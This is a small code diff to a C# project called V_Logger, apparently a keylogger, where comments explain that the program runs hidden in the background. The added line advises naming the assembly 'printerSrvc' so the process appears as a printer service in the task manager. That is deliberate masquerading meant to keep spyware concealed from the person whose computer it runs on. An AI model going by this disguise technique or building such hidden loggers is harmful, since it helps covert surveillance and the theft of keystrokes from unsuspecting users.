@@ -11,6 +11,7 @@ namespace V_Logger
     {
         //Set the application properties to windows application, then the program remain hidden in background.
         //you can shut down it in the task manager, finding its name
+        //set assembly name and default namespace : printerSrvc so the file in the task manager appeas as printerSrvc.exe
 
 
         [DllImport("User32.dll")]
